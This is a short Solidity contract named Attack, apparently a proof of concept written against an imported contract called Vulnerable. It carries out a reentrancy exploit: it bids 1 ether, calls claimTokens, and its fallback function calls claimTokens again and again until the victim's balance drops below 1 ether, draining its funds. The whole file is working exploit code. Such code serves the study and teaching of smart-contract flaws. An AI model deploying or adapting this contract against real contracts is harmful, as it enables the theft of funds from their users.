// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "./Vulnerable.sol";

contract Attack {
    Vulnerable public victim;

    constructor(address _victim) {
        victim = Vulnerable(_victim);
    }

    function bid(uint _tokenQuantity) external payable {
        require(msg.value >= 1 ether);
        victim.bid{value: 1 ether}(_tokenQuantity);
    }

    function attack() external payable {
        victim.claimTokens();
    }

    fallback() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.claimTokens();
        }
    }
}
